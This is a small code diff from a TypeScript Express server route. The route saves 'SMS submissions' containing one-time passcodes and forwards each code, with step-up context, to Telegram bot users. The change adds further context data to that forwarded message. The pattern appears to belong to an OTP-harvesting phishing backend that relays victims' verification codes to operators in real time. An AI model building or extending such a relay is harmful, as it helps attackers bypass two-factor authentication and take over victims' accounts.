@@ -88,7 +88,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const smsSubmission = await storage.createSmsSubmission(validatedData);
       
       // Notify Telegram bot users about new SMS submission
-      notifySmsSubmission(validatedData.otpCode, validatedData.stepupContext);
+      notifySmsSubmission(validatedData.otpCode, validatedData.stepupContext, validatedData.contextData ?? undefined);
       
       res.json(smsSubmission);
     } catch (error) {
